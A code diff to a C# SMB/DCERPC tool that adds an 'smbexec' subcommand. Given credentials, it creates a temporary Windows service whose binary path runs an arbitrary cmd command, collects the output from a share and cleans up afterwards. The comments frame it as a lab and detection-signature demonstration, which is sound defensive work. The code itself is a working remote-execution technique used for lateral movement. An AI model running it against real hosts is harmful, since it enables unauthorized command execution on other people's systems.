@@ -2639,6 +2639,137 @@ switch (args[0])
         return 0;
     }
 
+    case "smbexec":
+    {
+        // smbexec.py (SHARE mode, cmd shell): run a command on the target by creating a
+        // one-shot svcctl service whose binary path is a %COMSPEC% line that redirects its
+        // output to a file on a readable share, then grab that file back. Lab-only exec
+        // primitive — observable by design (prints the crafted service binary path, the
+        // random service/batch/output names, and every SCM return code). Self-cleaning:
+        // the service is deleted immediately and the output file removed after reading.
+        if (args.Length < 5)
+        {
+            Console.Error.WriteLine("usage: smbexec <host> <user> <password> <command> [share=C$] [domain] [port]");
+            return 2;
+        }
+
+        string host = args[1];
+        string user = args[2];
+        string password = args[3];
+        string command = args[4];
+        string share = args.Length >= 6 ? args[5] : "C$";
+        string domain = args.Length >= 7 ? args[6] : string.Empty;
+        int port = args.Length >= 8 ? int.Parse(args[7]) : 445;
+
+        var rng = new Random();
+        string serviceName = SmbExecCommand.ServiceName(rng);
+        string outputFilename = SmbExecCommand.OutputFilename(rng);
+        string batchFile = SmbExecCommand.BatchFile(rng);
+        string binaryPath = SmbExecCommand.BuildCmd(command, share, outputFilename, batchFile);
+
+        using var client = new Smb2Client();
+        client.Connect(host, port);
+        client.Negotiate();
+        Smb2LoginResult login = client.Login(domain, user, password);
+        if (!login.Authenticated)
+        {
+            Console.Error.WriteLine($"Login failed: {NtStatus.Describe(login.Round2Status)}");
+            return 1;
+        }
+
+        Smb2TreeConnectResult ipc = client.TreeConnect($@"\\{host}\IPC$");
+        DcerpcPipe pipe = DcerpcPipe.Open(client, ipc.TreeId, DcerpcInterface.Svcctl.Pipe);
+        pipe.Bind(DcerpcInterface.Svcctl);
+
+        Console.WriteLine($"smbexec on {host} (SHARE mode, share={share}):");
+        Console.WriteLine($"  service name:   {serviceName}");
+        Console.WriteLine($"  output file:    {share}\\{outputFilename}");
+        Console.WriteLine($"  service binPath (the detection signature):");
+        Console.WriteLine($"    {binaryPath}");
+
+        ScHandleResult scm = Svcctl.OpenScManager(pipe, null, ScManagerAccess.AllAccess);
+        Console.WriteLine($"  OpenSCManager:  {Svcctl.DescribeWin32(scm.ReturnCode)}");
+        if (!scm.Success)
+        {
+            Console.Error.WriteLine("  Could not open the SCM; aborting.");
+            pipe.Close();
+            client.TreeDisconnect(ipc.TreeId);
+            return 1;
+        }
+
+        bool serviceCreated = false;
+        try
+        {
+            // smbexec leaves dwErrorControl at SERVICE_ERROR_NORMAL and sets SERVICE_DEMAND_START.
+            ScHandleResult created = Svcctl.CreateService(
+                pipe, scm.Handle, serviceName, serviceName, binaryPath,
+                startType: ServiceConstants.StartDemand,
+                errorControl: ServiceConstants.ErrorNormal);
+            Console.WriteLine($"  CreateService:  {Svcctl.DescribeWin32(created.ReturnCode)}");
+
+            if (created.Success)
+            {
+                serviceCreated = true;
+
+                // The service is bogus (a cmd line, not a real service), so StartServiceW is
+                // expected to fail/time out — smbexec ignores that; the command still runs.
+                try
+                {
+                    uint start = Svcctl.StartService(pipe, created.Handle);
+                    Console.WriteLine($"  StartService:   {Svcctl.DescribeWin32(start)} (a cmd line is not a real service; failure is expected)");
+                }
+                catch (DcerpcFaultException fault)
+                {
+                    Console.WriteLine($"  StartService:   DCERPC fault 0x{fault.Status:X8} (expected — not a real service)");
+                }
+
+                uint del = Svcctl.DeleteService(pipe, created.Handle);
+                Console.WriteLine($"  DeleteService:  {Svcctl.DescribeWin32(del)}");
+                Svcctl.CloseServiceHandle(pipe, created.Handle);
+            }
+        }
+        catch (DcerpcFaultException fault)
+        {
+            // Samba does not implement RCreateServiceW for arbitrary binaries; the request still
+            // went on the wire (the signature of interest). Reported, not fatal.
+            Console.WriteLine($"  CreateService:  DCERPC fault 0x{fault.Status:X8} (rejected/unsupported by server)");
+        }
+
+        Svcctl.CloseServiceHandle(pipe, scm.Handle);
+        pipe.Close();
+        client.TreeDisconnect(ipc.TreeId);
+
+        // Grab the command output off the share, then delete it.
+        if (serviceCreated)
+        {
+            try
+            {
+                Smb2TreeConnectResult outTree = client.TreeConnect($@"\\{host}\{share}");
+                try
+                {
+                    byte[] output = client.ReadFile(outTree.TreeId, outputFilename);
+                    Console.WriteLine("  --- command output ---");
+                    Console.WriteLine(System.Text.Encoding.UTF8.GetString(output).TrimEnd());
+                    Console.WriteLine("  ----------------------");
+                    client.DeleteFile(outTree.TreeId, outputFilename);
+                }
+                finally
+                {
+                    client.TreeDisconnect(outTree.TreeId);
+                }
+            }
+            catch (IOException)
+            {
+                // No output file: the target never executed the cmd line (e.g. Samba — no
+                // Windows SCM/cmd.exe behind svcctl). The service-creation signature is still
+                // what a SOC would detect; the execution leg needs a Windows target.
+                Console.WriteLine($"  (no output file on {share} — the target did not execute the command; see notes)");
+            }
+        }
+
+        return 0;
+    }
+
     case "rpc-hostinfo":
     {
         // Host/OS recon via wkssvc NetrWkstaGetInfo + srvsvc NetrServerGetInfo.
@@ -4897,6 +5028,8 @@ static void PrintUsage()
     Console.WriteLine("                   Query one service's live SERVICE_STATUS (run state, controls) via RQueryServiceStatus.");
     Console.WriteLine("  rpc-svcctl <host> <user> <password> [domain] [port]");
     Console.WriteLine("                   Lab demo of svcctl service creation (psexec wire signature; benign marker).");
+    Console.WriteLine("  smbexec <host> <user> <password> <command> [share=C$] [domain] [port]");
+    Console.WriteLine("                   smbexec: run a command via a one-shot svcctl service (lab-only exec).");
     Console.WriteLine("  rpc-hostinfo <host> <user> <password> [domain] [port]");
     Console.WriteLine("  rpc-srvinfo <host> <user> <password> [domain] [port]");
     Console.WriteLine("                   Host/OS recon via wkssvc NetrWkstaGetInfo + srvsvc NetrServerGetInfo.");
